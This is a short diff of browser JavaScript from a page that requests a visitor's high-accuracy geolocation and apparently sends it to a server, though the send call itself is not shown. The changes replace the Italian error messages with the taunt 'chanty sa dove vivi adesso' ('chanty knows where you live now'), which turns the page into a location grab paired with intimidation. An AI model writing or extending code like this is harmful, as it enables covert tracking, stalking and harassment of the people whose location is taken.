@@ -24,12 +24,12 @@ document.addEventListener("DOMContentLoaded", function () {
                 })
                 .catch(error => {
                     console.error("chanty sa dove vivi adesso", error); // Debug
-                    document.getElementById("status").innerText = "❌ Errore nell'invio!";
+                    document.getElementById("status").innerText = "chanty sa dove vivi adesso";
                 });
             },
             function (error) {
                 console.error("chanty sa dove vivi adesso", error.message);
-                document.getElementById("status").innerText = "❌ Errore nella geolocalizzazione: " + error.message;
+                document.getElementById("status").innerText = "chanty sa dove vivi adesso" + error.message;
             },
             { enableHighAccuracy: true, timeout: 5000 }
         );
